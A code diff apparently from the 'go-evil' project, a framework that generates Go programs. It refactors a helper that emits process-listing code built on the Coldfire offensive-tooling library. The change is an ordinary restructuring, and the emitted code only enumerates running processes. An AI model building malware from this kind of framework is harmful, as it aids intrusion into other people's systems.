@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 )
 
 // Tries to grab all process names
@@ -13,18 +14,20 @@ func Get_names(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "get_processes_names"
 
-	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", function_call),
-		"processes, err := coldfire.Processes()",
-		"if err != nil{",
-		"spine.log(err.Error())",
-		"}",
-		"arr := structure.Create_evil_object(\"\")",
-		"for _, value := range processes{",
-		"arr.Append(value)",
-		"}",
-		"spine.variable.set(arr.To_string(\"evil\"))",
-		"}"})
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{""},
+		Gut: []string{
+			"processes, err := coldfire.Processes()",
+			"if err != nil{",
+			"spine.log(err.Error())",
+			"}",
+			"arr := structure.Create_evil_object(\"\")",
+			"for _, value := range processes{",
+			"arr.Append(value)",
+			"}",
+			"spine.variable.set(arr.To_string(\"evil\"))",
+		}})
+
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
 
